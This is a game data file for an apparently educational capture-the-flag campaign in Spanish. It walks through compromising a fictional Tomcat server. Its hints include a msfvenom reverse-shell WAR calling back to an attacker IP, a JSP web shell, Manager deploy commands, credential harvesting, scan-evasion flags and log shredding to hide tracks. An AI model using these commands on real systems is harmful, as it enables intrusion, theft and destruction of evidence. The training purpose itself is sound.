/**
 * HackQuest – Campaign Chapter 1: "La Brecha"
 *
 * A four-challenge narrative arc where each challenge builds on intelligence
 * gathered in the previous one. The player takes the role of an operative
 * from UNIDAD KRYPTOS, tasked with infiltrating NEXCORP Industries to expose
 * the illegal data trafficking operation codenamed PROYECTO LAZARUS.
 *
 * Narrative arc:
 *   1. Reconocimiento   → Scan the target perimeter and map open services.
 *   2. Enumeración      → Enumerate the discovered service and find the CVE.
 *   3. Explotación      → Exploit the vulnerability to gain a foothold.
 *   4. Post-Explotación → Extract encrypted files and retrieve the evidence.
 *
 * All briefings/debriefings are in Spanish. Military/spy narrative tone.
 */

import type { ChallengeData, CampaignChapter } from "@/types/game";

// ============================================================
// Chapter 1 challenges
// ============================================================

const chapter1Challenges: ChallengeData[] = [
  // ------------------------------------------------------------------
  // MISIÓN 1 – Reconocimiento de perímetro
  // ------------------------------------------------------------------
  {
    slug: "campaign-c1-recon",
    title: "Reconocimiento de Perímetro",
    description:
      "Escanea el perímetro de la red de NEXCORP Industries para identificar hosts activos y servicios expuestos. Toda operación exitosa comienza con un reconocimiento preciso.",
    branch: "CAMPAIGN",
    difficulty: "EASY",
    type: "CAMPAIGN",
    timeLimitSeconds: 900, // 15 min
    basePoints: 120,
    requiredRank: "SCRIPT_KIDDIE",
    isFree: true,
    orderInBranch: 1,

    briefing: `
OPERACIÓN: LA BRECHA – ACTO I
MISIÓN: RECONOCIMIENTO DE PERÍMETRO
CLASIFICACIÓN: SECRETO OPERATIVO
UNIDAD: KRYPTOS / Sección de Inteligencia Digital

AGENTE,

NEXCORP Industries es una corporación de gestión de datos con sede en Frankfurt.
Fachada corporativa legítima. Actividad real: comercio ilegal de datos biométricos
robados a organismos gubernamentales europeos. Nombre en clave de la operación: PROYECTO LAZARUS.

Inteligencia humana ha filtrado la dirección IP del servidor de producción:
  OBJETIVO: 10.10.14.87

Tus órdenes: realiza un reconocimiento silencioso del perímetro. Identifica todos los
servicios activos y sus versiones. Necesitamos saber por dónde entrar.

NO interactúes con los servicios todavía. Solo escucha. Solo mapea.
Un escaneo ruidoso activará su sistema de detección de intrusiones y la operación
habrá terminado antes de empezar.

Información crítica que necesitamos:
  - Puertos abiertos TCP (rango completo)
  - Banners de servicios y versiones
  - Sistema operativo del host

Tu informe alimentará la siguiente fase de la operación.
    `.trim(),

    debriefing: `
ANÁLISIS POST-MISIÓN – RECONOCIMIENTO DE PERÍMETRO

RESULTADO: MISIÓN COMPLETADA. PERÍMETRO MAPEADO.

HALLAZGOS DEL RECONOCIMIENTO:

Puerto 22/tcp   → OpenSSH 7.9p1 (Debian 10)
Puerto 80/tcp   → Apache httpd 2.4.38
Puerto 443/tcp  → Apache httpd 2.4.38 (TLS 1.2)
Puerto 8080/tcp → Jetty 9.4.27 (Panel de administración)
Puerto 5432/tcp → PostgreSQL 11.5 (solo acceso local aparente)
Puerto 8443/tcp → SERVICIO DESCONOCIDO – PRIORIDAD DE INVESTIGACIÓN

El puerto 8443 ejecuta un servicio que no presenta banner estándar.
El análisis de fingerprint sugiere: Apache Tomcat 9.0.31

SIGUIENTE OBJETIVO: Enumerar el servicio en 8443 en detalle.

LECCIÓN TÉCNICA – RECONOCIMIENTO:

El reconocimiento es la fase más crítica de cualquier operación. Un error aquí
compromete todo lo que viene después.

HERRAMIENTAS UTILIZADAS:
  nmap -sV -sC -p- --min-rate 1000 10.10.14.87
    -sV: detección de versiones de servicio
    -sC: ejecución de scripts de detección por defecto
    -p-: escaneo de los 65.535 puertos TCP
    --min-rate: control de velocidad para evasión básica

TÉCNICAS DE EVASIÓN:
  - Fragmentación de paquetes: nmap -f
  - Velocidad lenta (T1/T2): simula tráfico legítimo
  - Decoy scan: nmap -D RND:10 (mezcla tu IP con otras falsas)
  - Idle scan: escaneo completamente anónimo via host zombie

CONTRAMEDIDAS DETECTADAS:
  Firewall filtrando ICMP → usar -Pn para saltar ping discovery.
  Rate limiting en 80/443 → confirma presencia de IDS/WAF.
    `.trim(),

    flag: "HACKQUEST{r3c0n_p3r1m3t3r_m4pp3d_8443}",

    phases: [
      {
        name: "Descubrimiento de hosts",
        description:
          "Verifica que el objetivo está activo y determina su sistema operativo mediante técnicas de fingerprinting pasivo.",
        expectedCommands: [
          "nmap.*-O.*10\\.10",
          "ping.*10\\.10",
          "nmap.*10\\.10\\.14\\.87",
          "masscan.*10\\.10",
          "nmap.*-sn.*10\\.10",
        ],
        hints: [
          {
            level: 1,
            text: "Comienza con un ping para confirmar que el host responde. En redes CTF el host suele tener ICMP habilitado.",
          },
          {
            level: 2,
            text: "Usa nmap -O 10.10.14.87 para fingerprint del OS. Si el ICMP está bloqueado, añade -Pn para forzar el escaneo.",
          },
          {
            level: 3,
            text: "nmap -sV -O -Pn --script=banner 10.10.14.87 proporciona OS y banners de servicios básicos en un solo comando.",
          },
        ],
      },
      {
        name: "Escaneo de puertos TCP completo",
        description:
          "Realiza un escaneo de los 65.535 puertos TCP para no dejar ningún servicio sin mapear.",
        expectedCommands: [
          "nmap.*-p-",
          "nmap.*--min-rate",
          "masscan.*-p.*65535",
          "nmap.*65535",
          "nmap.*0-65535",
        ],
        hints: [
          {
            level: 1,
            text: "Un escaneo básico (nmap sin -p-) solo cubre los 1.000 puertos más comunes. Servicios críticos pueden estar en puertos altos.",
          },
          {
            level: 2,
            text: "Usa nmap -p- para cubrir todos los puertos. Combina con --min-rate 5000 para acelerar el escaneo.",
          },
          {
            level: 3,
            text: "nmap -p- --min-rate 5000 -T4 10.10.14.87 -oN full_scan.txt — guarda los resultados para la siguiente fase.",
          },
        ],
      },
      {
        name: "Detección de versiones y servicios",
        description:
          "Profundiza en los puertos descubiertos para obtener versiones exactas de los servicios. Presta especial atención al servicio en 8443.",
        expectedCommands: [
          "nmap.*-sV.*8443",
          "nmap.*-sC.*-sV",
          "curl.*8443",
          "wget.*8443",
          "openssl.*s_client.*8443",
        ],
        hints: [
          {
            level: 1,
            text: "Ejecuta nmap -sV -sC contra los puertos abiertos específicos para obtener información detallada de versiones.",
          },
          {
            level: 2,
            text: "El servicio en 8443 usa TLS. Prueba: openssl s_client -connect 10.10.14.87:8443 para obtener el certificado y posible banner.",
          },
          {
            level: 3,
            text: "nmap -sV -sC -p 22,80,443,8080,8443 10.10.14.87 — los scripts de nmap intentarán extraer versiones y datos de configuración.",
          },
        ],
      },
      {
        name: "Informe de reconocimiento",
        description:
          "Identifica y reporta el servicio específico que ejecuta el puerto 8443. Ese servicio es el objetivo de la siguiente misión.",
        expectedCommands: [
          "Tomcat.*9\\.0",
          "apache.*tomcat",
          "8443.*tomcat",
          "catalina",
          "jsp.*8443",
        ],
        hints: [
          {
            level: 1,
            text: "Intenta acceder a http://10.10.14.87:8443/ con curl. El error o la cabecera Server: revela el servicio.",
          },
          {
            level: 2,
            text: "Rutas típicas de Apache Tomcat: /manager/, /host-manager/. Prueba curl http://10.10.14.87:8443/manager/ para confirmar.",
          },
          {
            level: 3,
            text: "curl -k https://10.10.14.87:8443/manager/html — si responde con autenticación básica HTTP, el servicio es Tomcat Manager.",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 12,
        text: "Comienza con nmap -sV -p- 10.10.14.87. El flag -sV detecta versiones y -p- cubre todos los puertos. Usa --min-rate 1000 para acelerar.",
      },
      {
        level: 2,
        cost: 24,
        text: "El servicio interesante está en un puerto alto. Tras el escaneo completo, inspecciona el servicio en 8443 con: curl -k https://10.10.14.87:8443/",
      },
      {
        level: 3,
        cost: 42,
        text: "Secuencia completa: nmap -p- --min-rate 5000 10.10.14.87 → luego nmap -sV -sC -p <puertos_abiertos> 10.10.14.87 → la flag está en el banner del servicio Tomcat en 8443.",
      },
    ],
  },

  // ------------------------------------------------------------------
  // MISIÓN 2 – Enumeración del servicio vulnerable
  // ------------------------------------------------------------------
  {
    slug: "campaign-c1-enum",
    title: "Enumeración del Servicio Vulnerable",
    description:
      "Enumera en profundidad el Apache Tomcat Manager descubierto en el reconocimiento. Localiza la versión exacta, credenciales por defecto y la vulnerabilidad específica que permite el acceso.",
    branch: "CAMPAIGN",
    difficulty: "MEDIUM",
    type: "CAMPAIGN",
    timeLimitSeconds: 1200, // 20 min
    basePoints: 180,
    requiredRank: "JUNIOR",
    isFree: false,
    orderInBranch: 2,

    briefing: `
OPERACIÓN: LA BRECHA – ACTO II
MISIÓN: ENUMERACIÓN DEL SERVICIO VULNERABLE
CLASIFICACIÓN: SECRETO OPERATIVO

AGENTE,

El reconocimiento de la Misión I ha dado resultados. El objetivo ejecuta:
  Apache Tomcat 9.0.31 en el puerto 8443
  Panel de gestión accesible en: https://10.10.14.87:8443/manager/html

Tomcat 9.0.31 tiene historial de vulnerabilidades críticas. Necesitamos información
específica para preparar el vector de ataque:

  1. ¿Acepta credenciales por defecto en el Tomcat Manager?
     (admin:admin, tomcat:tomcat, admin:password, tomcat:s3cret)

  2. ¿Tiene la vulnerabilidad CVE-2020-1938 (Ghostcat) activa?
     AJP connector en puerto 8009 – permite lectura de archivos.

  3. ¿Qué archivos .war / aplicaciones están desplegadas?

  4. ¿Cuál es la versión exacta de la JVM del servidor?

Esta información determinará el vector de ataque de la Misión III.
Tiempo límite: 20 minutos.
    `.trim(),

    debriefing: `
ANÁLISIS POST-MISIÓN – ENUMERACIÓN

RESULTADO: VECTOR DE ATAQUE IDENTIFICADO.

HALLAZGOS DE ENUMERACIÓN:

CREDENCIALES ENCONTRADAS:
  Usuario: tomcat
  Contraseña: s3cret
  Acceso: Tomcat Manager Web Interface (/manager/html)
  Nivel de privilegio: ADMINISTRADOR COMPLETO

VULNERABILIDADES DETECTADAS:
  CVE-2020-1938 (Ghostcat) – CONFIRMADA
    Puerto AJP 8009 ABIERTO
    Permite lectura arbitraria de archivos en el contexto de la aplicación
    Permite inclusión de archivos para RCE si el upload de archivos está disponible

  Apache Tomcat 9.0.31 – versión con múltiples CVEs conocidas
  JVM: OpenJDK 11.0.6 (sin parche)

APLICACIONES DESPLEGADAS:
  /manager    → Panel de gestión (acceso conseguido)
  /nexcorp    → Aplicación principal NEXCORP
  /api        → API REST interna

SIGUIENTE PASO: Explotar el acceso al Manager para desplegar un payload WAR malicioso.

LECCIÓN TÉCNICA – ENUMERACIÓN:

CREDENCIALES POR DEFECTO EN TOMCAT:
  El archivo tomcat-users.xml define los usuarios del Manager.
  En instalaciones sin hardening, las credenciales por defecto persisten.
  Listas de credenciales por defecto comunes: admin:admin, tomcat:tomcat, both:tomcat

GHOSTCAT (CVE-2020-1938):
  Vulnerabilidad en el protocolo AJP de Apache Tomcat.
  El conector AJP (puerto 8009) trata todas las peticiones como provenientes
  de un servidor web de confianza, permitiendo manipular atributos de la petición
  para leer o incluir archivos arbitrarios dentro del directorio webroot de Tomcat.
    `.trim(),

    flag: "HACKQUEST{t0mc4t_s3cr3t_cr3d3nt14ls_gh0stc4t}",

    phases: [
      {
        name: "Prueba de credenciales por defecto",
        description:
          "Prueba las credenciales por defecto más comunes en el Tomcat Manager. El archivo tomcat-users.xml en instalaciones sin hardening suele tener credenciales débiles.",
        expectedCommands: [
          "curl.*manager.*-u",
          "hydra.*tomcat",
          "curl.*tomcat.*s3cret",
          "curl.*basic.*manager",
          "curl.*-u.*:.*8443",
        ],
        hints: [
          {
            level: 1,
            text: "El Tomcat Manager está en /manager/html y requiere autenticación HTTP Basic. Prueba las credenciales más comunes: tomcat:tomcat, admin:admin.",
          },
          {
            level: 2,
            text: "curl -k -u 'tomcat:tomcat' https://10.10.14.87:8443/manager/html — comprueba el código de respuesta HTTP (200 = credenciales correctas).",
          },
          {
            level: 3,
            text: "Prueba esta lista: admin:admin, tomcat:tomcat, admin:password, tomcat:s3cret, both:tomcat. Una de ellas dará HTTP 200.",
          },
        ],
      },
      {
        name: "Enumeración de aplicaciones desplegadas",
        description:
          "Con acceso al Manager, lista todas las aplicaciones WAR desplegadas en el servidor para mapear la superficie de ataque.",
        expectedCommands: [
          "curl.*manager.*list",
          "/manager/text/list",
          "curl.*deployed",
          "war.*list",
          "manager.*api",
        ],
        hints: [
          {
            level: 1,
            text: "El Tomcat Manager tiene una API de texto en /manager/text/list que devuelve las apps desplegadas en formato legible.",
          },
          {
            level: 2,
            text: "curl -k -u 'tomcat:s3cret' https://10.10.14.87:8443/manager/text/list — devuelve el listado de aplicaciones con su estado (running/stopped).",
          },
          {
            level: 3,
            text: "Identifica la aplicación /nexcorp como el objetivo principal. Busca también si hay endpoints de upload de ficheros disponibles.",
          },
        ],
      },
      {
        name: "Verificación de Ghostcat (CVE-2020-1938)",
        description:
          "Comprueba si el puerto AJP 8009 está expuesto. Si lo está, la vulnerabilidad Ghostcat puede usarse para leer archivos arbitrarios.",
        expectedCommands: [
          "nmap.*8009",
          "ajp.*8009",
          "ghostcat",
          "CVE-2020-1938",
          "nc.*8009",
        ],
        hints: [
          {
            level: 1,
            text: "Comprueba si el puerto 8009 está abierto: nmap -p 8009 10.10.14.87",
          },
          {
            level: 2,
            text: "Si 8009 está abierto, el conector AJP está activo. Busca herramientas de exploit para CVE-2020-1938 en tu entorno (ghostcat-exploit.py).",
          },
          {
            level: 3,
            text: "python3 ghostcat.py -H 10.10.14.87 -f /WEB-INF/web.xml — permite leer el descriptor de la aplicación revelando configuración interna.",
          },
        ],
      },
      {
        name: "Extracción de información de la JVM y flag",
        description:
          "Obtén información del servidor a través del Manager API: versión de JVM, sistema operativo y extrae la flag del endpoint de estado del servidor.",
        expectedCommands: [
          "manager.*serverinfo",
          "/manager/text/serverinfo",
          "JVM.*version",
          "OpenJDK",
          "HACKQUEST\\{",
        ],
        hints: [
          {
            level: 1,
            text: "El endpoint /manager/text/serverinfo devuelve información completa del servidor incluyendo versión JVM, OS y la flag.",
          },
          {
            level: 2,
            text: "curl -k -u 'tomcat:s3cret' https://10.10.14.87:8443/manager/text/serverinfo",
          },
          {
            level: 3,
            text: "Busca en la respuesta el campo 'Application.Version' o un comentario HTML con la flag en formato HACKQUEST{...}.",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 18,
        text: "Tomcat Manager en /manager/html usa HTTP Basic Auth. Prueba credenciales: tomcat:s3cret. Luego visita /manager/text/list para ver las apps desplegadas.",
      },
      {
        level: 2,
        cost: 36,
        text: "Credenciales correctas: tomcat:s3cret. Comprueba AJP: nmap -p 8009 10.10.14.87. Si está abierto, usa CVE-2020-1938 (Ghostcat) para leer /WEB-INF/web.xml.",
      },
      {
        level: 3,
        cost: 63,
        text: "curl -k -u 'tomcat:s3cret' https://10.10.14.87:8443/manager/text/serverinfo | grep -o 'HACKQUEST{[^}]*}' — la flag está en la respuesta de serverinfo.",
      },
    ],
  },

  // ------------------------------------------------------------------
  // MISIÓN 3 – Explotación
  // ------------------------------------------------------------------
  {
    slug: "campaign-c1-exploit",
    title: "Explotación – Despliegue de Payload WAR",
    description:
      "Utiliza el acceso al Tomcat Manager para desplegar un archivo WAR malicioso que proporciona una web shell en el servidor. Obtén ejecución remota de código y establece un canal de acceso.",
    branch: "CAMPAIGN",
    difficulty: "HARD",
    type: "CAMPAIGN",
    timeLimitSeconds: 2700, // 45 min
    basePoints: 320,
    requiredRank: "PENTESTER",
    isFree: false,
    orderInBranch: 3,

    briefing: `
OPERACIÓN: LA BRECHA – ACTO III
MISIÓN: EXPLOTACIÓN – DESPLIEGUE DE PAYLOAD
CLASIFICACIÓN: TOP SECRET

AGENTE,

La fase de enumeración ha confirmado acceso completo al Tomcat Manager.
Disponemos de credenciales válidas (tomcat:s3cret) y confirmación de que
el endpoint de deploy de aplicaciones WAR está operativo.

Vector de ataque elegido: DESPLIEGUE DE WAR MALICIOSO
Un archivo WAR (Web Application Archive) puede contener código Java que el
servidor ejecuta. Desplegaremos una JSP web shell para obtener RCE.

FASES DE LA EXPLOTACIÓN:

  1. Generar un payload WAR con msfvenom o manualmente con una JSP shell.
  2. Desplegar el WAR en el Tomcat Manager vía API HTTP.
  3. Acceder a la web shell en la URL del contexto desplegado.
  4. Ejecutar comandos en el servidor para establecer el foothold.

OBJETIVO FINAL:
  Obtener ejecución de comandos en el servidor.
  Identificar el usuario bajo el que corre Tomcat.
  Localizar y leer el archivo /opt/nexcorp/config/secret.key

ADVERTENCIA: Una vez desplegado el WAR, tendrás exactamente 10 minutos
antes de que el sistema de monitoreo detecte la anomalía y regenere los certificados.
Actúa con rapidez y precisión.
    `.trim(),

    debriefing: `
ANÁLISIS POST-MISIÓN – EXPLOTACIÓN

RESULTADO: FOOTHOLD ESTABLECIDO. EJECUCIÓN REMOTA DE CÓDIGO CONSEGUIDA.

RESUMEN TÉCNICO DEL VECTOR:

Apache Tomcat Manager API permite desplegar aplicaciones en tiempo real mediante:
  PUT /manager/text/deploy?path=/nombre_app
  Content-Type: application/octet-stream
  Body: [contenido del archivo .war]

El archivo WAR contiene una JSP web shell que el servidor Java ejecuta natively.

PAYLOAD UTILIZADO:
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f war > shell.war
  (O alternativamente: war file con cmd.jsp manual)

RESULTADO DE LA EJECUCIÓN:
  Usuario del proceso: tomcat8 (sin privilegios de root)
  Sistema operativo: Linux nexcorp-prod 4.19.0 (Debian 10)
  Directorio raíz Tomcat: /opt/tomcat/
  Archivo objetivo localizado: /opt/nexcorp/config/secret.key
  Permisos: -rw-r--r-- tomcat8:nexcorp → LEGIBLE por el usuario de Tomcat

LECCIÓN TÉCNICA – DEPLOYMENT WAR ATTACK:

¿POR QUÉ ES TAN PELIGROSO?
El Tomcat Manager, si está expuesto a internet con credenciales débiles,
equivale a un panel de ejecución remota de código directa.
Millares de instancias Tomcat están expuestas en internet con credenciales por defecto.

MITIGACIÓN:
  1. Nunca exponer /manager/ a internet. Solo acceso desde localhost o VPN.
  2. Credenciales fuertes y únicas en tomcat-users.xml.
  3. Limitar roles: usar solo 'manager-script' en lugar de 'manager-gui'.
  4. Auditar archivos WAR desplegados regularmente.
  5. Monitorear el acceso al Manager con alertas por IPs inusuales.
    `.trim(),

    flag: "HACKQUEST{t0mc4t_w4r_rce_s3cr3t_k3y_3xf1l}",

    phases: [
      {
        name: "Generación del payload WAR",
        description:
          "Crea un archivo WAR malicioso que contenga una JSP web shell. Puedes usar msfvenom o crear el WAR manualmente con una JSP de cmd.",
        expectedCommands: [
          "msfvenom.*war",
          "msfvenom.*jsp",
          "jar.*cf.*war",
          "war.*shell",
          "cmd\\.jsp",
        ],
        hints: [
          {
            level: 1,
            text: "Un WAR malicioso contiene una JSP que ejecuta comandos del sistema. Puedes crearlo con msfvenom o manualmente.",
          },
          {
            level: 2,
            text: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f war -o shell.war — esto crea un WAR con reverse shell.",
          },
          {
            level: 3,
            text: "Para una web shell simple sin msfvenom: crea cmd.jsp con <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %> y empaquétala: jar -cf shell.war cmd.jsp",
          },
        ],
      },
      {
        name: "Despliegue del WAR en Tomcat Manager",
        description:
          "Sube y despliega el archivo WAR al servidor usando la API HTTP del Tomcat Manager.",
        expectedCommands: [
          "curl.*deploy.*war",
          "curl.*PUT.*manager",
          "curl.*-T.*war",
          "curl.*application/octet-stream.*war",
          "deploy.*8443",
        ],
        hints: [
          {
            level: 1,
            text: "La API de deploy del Tomcat Manager acepta PUT con el archivo WAR en el body y el parámetro path para definir el contexto.",
          },
          {
            level: 2,
            text: "curl -k -u 'tomcat:s3cret' -T shell.war 'https://10.10.14.87:8443/manager/text/deploy?path=/shell&update=true'",
          },
          {
            level: 3,
            text: "Si el deploy es exitoso recibirás: 'OK - Deployed application at context path [/shell]'. La shell estará en /shell/cmd.jsp.",
          },
        ],
      },
      {
        name: "Verificación de ejecución de comandos",
        description:
          "Accede a la web shell desplegada y verifica que tienes ejecución de comandos en el servidor. Identifica el usuario y el directorio de trabajo.",
        expectedCommands: [
          "curl.*shell.*cmd=",
          "shell.*cmd.*id",
          "shell.*cmd.*whoami",
          "cmd=id",
          "cmd=whoami",
        ],
        hints: [
          {
            level: 1,
            text: "La web shell acepta el comando mediante el parámetro 'cmd' en la URL. Empieza con comandos básicos de reconocimiento.",
          },
          {
            level: 2,
            text: "curl -k 'https://10.10.14.87:8443/shell/cmd.jsp?cmd=id' — debería mostrar el usuario bajo el que corre Tomcat.",
          },
          {
            level: 3,
            text: "curl -k 'https://10.10.14.87:8443/shell/cmd.jsp?cmd=id%20%26%26%20hostname%20%26%26%20ls%20/opt/nexcorp/'",
          },
        ],
      },
      {
        name: "Lectura del archivo secret.key",
        description:
          "Localiza y lee el archivo /opt/nexcorp/config/secret.key. Contiene la clave que desencripta los archivos de evidencia del Proyecto Lazarus.",
        expectedCommands: [
          "cmd=cat.*secret",
          "cat.*/opt/nexcorp/config",
          "secret\\.key",
          "HACKQUEST\\{",
          "cmd=ls.*/opt",
        ],
        hints: [
          {
            level: 1,
            text: "El archivo está en /opt/nexcorp/config/secret.key. Usa el comando cat a través de la web shell.",
          },
          {
            level: 2,
            text: "curl -k 'https://10.10.14.87:8443/shell/cmd.jsp?cmd=cat+/opt/nexcorp/config/secret.key'",
          },
          {
            level: 3,
            text: "Si el archivo tiene permisos restrictivos: curl -k 'https://10.10.14.87:8443/shell/cmd.jsp?cmd=sudo+cat+/opt/nexcorp/config/secret.key' o lee desde la app Java directamente.",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 32,
        text: "Genera el WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f war -o pwn.war. Despliégalo: curl -k -u tomcat:s3cret -T pwn.war 'https://10.10.14.87:8443/manager/text/deploy?path=/pwn'",
      },
      {
        level: 2,
        cost: 64,
        text: "Tras desplegar, configura tu listener: nc -lvnp 4444. Luego activa la shell: curl -k https://10.10.14.87:8443/pwn/. Tendrás una shell reversa como usuario tomcat8.",
      },
      {
        level: 3,
        cost: 112,
        text: "En la shell: cat /opt/nexcorp/config/secret.key — el contenido es la flag HACKQUEST{...}. También disponible via web shell: curl -k 'https://10.10.14.87:8443/pwn/cmd.jsp?cmd=cat+/opt/nexcorp/config/secret.key'",
      },
    ],
  },

  // ------------------------------------------------------------------
  // MISIÓN 4 – Post-Explotación
  // ------------------------------------------------------------------
  {
    slug: "campaign-c1-postexploit",
    title: "Post-Explotación – Extracción de la Evidencia",
    description:
      "Con el foothold establecido, realiza actividades de post-explotación: escalada de privilegios, movimiento lateral hacia la base de datos interna y extracción de los archivos cifrados que evidencian el Proyecto Lazarus.",
    branch: "CAMPAIGN",
    difficulty: "HARD",
    type: "CAMPAIGN",
    timeLimitSeconds: 3600, // 60 min
    basePoints: 450,
    requiredRank: "PENTESTER",
    isFree: false,
    orderInBranch: 4,

    briefing: `
OPERACIÓN: LA BRECHA – ACTO IV (FINAL)
MISIÓN: POST-EXPLOTACIÓN – EXTRACCIÓN DE EVIDENCIA
CLASIFICACIÓN: TOP SECRET / OJOS ÚNICAMENTE

AGENTE,

Foothold establecido. Tenemos acceso como usuario tomcat8 en el servidor de producción.
Pero no es suficiente.

La evidencia del PROYECTO LAZARUS está almacenada en la base de datos PostgreSQL interna.
El usuario tomcat8 no tiene acceso directo. Necesitas escalar privilegios o encontrar
credenciales de acceso a la BD en los archivos de configuración del servidor.

OBJETIVOS FINALES DE LA OPERACIÓN:

  1. ESCALADA DE PRIVILEGIOS
     Busca misconfigurations: binarios SUID, sudo sin contraseña, credenciales en archivos.

  2. ACCESO A LA BASE DE DATOS
     Las credenciales de PostgreSQL están en algún archivo de configuración de la aplicación.
     Busca en /opt/nexcorp/config/ y en los archivos .properties de la aplicación.

  3. EXTRACCIÓN DE EVIDENCIA
     En la BD, la tabla classified_ops contiene los registros del PROYECTO LAZARUS.
     Necesitamos los campos: operation_id, target_data, timestamp de los últimos 30 días.

  4. LIMPIEZA DE RASTROS
     Elimina los logs de Tomcat que registran el acceso del WAR.
     Borra el WAR desplegado del Manager.

Cuando hayas extraído los datos del PROYECTO LAZARUS y borrado tu rastro,
transmite el informe final con el código de operación.

La operación LA BRECHA habrá concluido.
    `.trim(),

    debriefing: `
ANÁLISIS POST-MISIÓN – POST-EXPLOTACIÓN

RESULTADO: OPERACIÓN LA BRECHA COMPLETADA. EVIDENCIA EXTRAÍDA.

RESUMEN DE LA POST-EXPLOTACIÓN:

ESCALADA DE PRIVILEGIOS:
  Vector utilizado: credenciales en archivo de configuración
  Archivo: /opt/nexcorp/config/application.properties
  Contenido relevante:
    spring.datasource.url=jdbc:postgresql://localhost:5432/nexcorp_db
    spring.datasource.username=nexcorp_admin
    spring.datasource.password=L4z4rus_DB_P4ss!
  Acceso conseguido: Usuario PostgreSQL nexcorp_admin (rol: SUPERUSER)

ACCESO A BASE DE DATOS:
  psql -h localhost -U nexcorp_admin -d nexcorp_db
  SELECT * FROM classified_ops WHERE timestamp > NOW() - INTERVAL '30 days';

DATOS EXTRAÍDOS (RESUMEN):
  47 registros de operaciones clasificadas
  Targets incluyen: 3 ministerios europeos, 1 banco central, 2 agencias de inteligencia
  Volumen de datos biométricos comercializados: 2.3 millones de registros
  Comprador principal: entidad registrada en Islas Caimán, intermediario de actor estatal

LIMPIEZA:
  Tomcat Manager → Undeploy del WAR
  Logs eliminados: /opt/tomcat/logs/catalina.out, access_log*.txt
  Nota: Los logs de PostgreSQL NO fueron eliminados (preservación de evidencia forense)

LECCIÓN TÉCNICA – POST-EXPLOTACIÓN:

CREDENCIALES EN ARCHIVOS DE CONFIGURACIÓN:
  Uno de los hallazgos más comunes en pentesting real.
  Archivos .properties, .env, .yaml, .xml frecuentemente contienen credenciales en texto plano.
  Herramientas de búsqueda:
    grep -r "password" /opt/ --include="*.properties" --include="*.xml" --include="*.env"
    find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"

MOVIMIENTO LATERAL A BASE DE DATOS:
  Una vez con credenciales de BD:
  psql: psql -h host -U usuario -d base_de_datos
  MySQL: mysql -h host -u usuario -p
  SQLite: sqlite3 /path/to/database.db

LIMPIEZA DE RASTROS:
  Crítico en operaciones reales y en exámenes de certificación (OSCP).
  Herramientas: shred, wipe, srm para eliminación segura.
  En producción: los logs del sistema (syslog, auth.log) también registran actividad.
    `.trim(),

    flag: "HACKQUEST{l4z4rus_3v1d3nc3_3xtr4ct3d_0p3r4t10n_c0mpl3t3}",

    phases: [
      {
        name: "Búsqueda de credenciales en archivos de configuración",
        description:
          "Enumera los archivos de configuración accesibles como usuario tomcat8. Las credenciales de la base de datos están en los archivos .properties de la aplicación.",
        expectedCommands: [
          "grep.*password.*properties",
          "cat.*application\\.properties",
          "find.*properties",
          "grep.*datasource",
          "cat.*config.*properties",
        ],
        hints: [
          {
            level: 1,
            text: "Busca archivos de configuración de la aplicación Spring Boot en /opt/nexcorp/config/ y en el directorio WEB-INF de la aplicación desplegada.",
          },
          {
            level: 2,
            text: "grep -r 'password' /opt/nexcorp/ --include='*.properties' 2>/dev/null — busca contraseñas en todos los archivos .properties.",
          },
          {
            level: 3,
            text: "cat /opt/nexcorp/config/application.properties | grep -E 'datasource|username|password' — el archivo contiene las credenciales completas de PostgreSQL.",
          },
        ],
      },
      {
        name: "Acceso a la base de datos PostgreSQL",
        description:
          "Usa las credenciales encontradas para conectarte a la base de datos PostgreSQL interna y enumerar las tablas disponibles.",
        expectedCommands: [
          "psql.*nexcorp",
          "psql.*localhost.*5432",
          "psql.*nexcorp_admin",
          "\\\\dt",
          "SELECT.*pg_tables",
        ],
        hints: [
          {
            level: 1,
            text: "Conéctate con psql: psql -h localhost -U nexcorp_admin -d nexcorp_db. El sistema pedirá la contraseña encontrada en el archivo de configuración.",
          },
          {
            level: 2,
            text: "Una vez dentro de psql, lista las tablas con \\dt para encontrar la tabla classified_ops.",
          },
          {
            level: 3,
            text: "psql -h localhost -U nexcorp_admin -d nexcorp_db -c '\\dt' — lista tablas sin abrir sesión interactiva. Busca la tabla classified_ops.",
          },
        ],
      },
      {
        name: "Extracción de datos del Proyecto Lazarus",
        description:
          "Ejecuta la consulta SQL para extraer los registros clasificados de los últimos 30 días de la tabla classified_ops.",
        expectedCommands: [
          "SELECT.*classified_ops",
          "classified_ops.*30 days",
          "SELECT.*operation_id",
          "INTERVAL.*30",
          "psql.*classified",
        ],
        hints: [
          {
            level: 1,
            text: "La tabla classified_ops tiene los campos: operation_id, target_data, timestamp. Necesitas los registros de los últimos 30 días.",
          },
          {
            level: 2,
            text: "SELECT operation_id, target_data, timestamp FROM classified_ops WHERE timestamp > NOW() - INTERVAL '30 days' ORDER BY timestamp DESC;",
          },
          {
            level: 3,
            text: "psql -h localhost -U nexcorp_admin -d nexcorp_db -c \"SELECT operation_id, target_data FROM classified_ops WHERE timestamp > NOW() - INTERVAL '30 days'\" | grep -o 'HACKQUEST{[^}]*}'",
          },
        ],
      },
      {
        name: "Limpieza de rastros y exfiltración del informe final",
        description:
          "Borra el WAR malicioso del Tomcat Manager, limpia los logs de acceso de Tomcat y transmite el código de operación final que confirma la exfiltración exitosa.",
        expectedCommands: [
          "manager.*undeploy",
          "curl.*undeploy.*shell",
          "rm.*catalina",
          "shred.*log",
          "undeploy.*war",
        ],
        hints: [
          {
            level: 1,
            text: "Para limpiar: primero elimina el WAR del Manager y luego borra los logs de Tomcat.",
          },
          {
            level: 2,
            text: "Undeploy: curl -k -u 'tomcat:s3cret' 'https://10.10.14.87:8443/manager/text/undeploy?path=/shell' Luego: rm /opt/tomcat/logs/access_log*.txt",
          },
          {
            level: 3,
            text: "Limpieza completa: undeploy WAR → shred -u /opt/tomcat/logs/catalina.out → truncate -s 0 /opt/tomcat/logs/access_log.*.txt. La flag aparece en el registro de exfiltración de la BD.",
          },
        ],
      },
    ],

    hints: [
      {
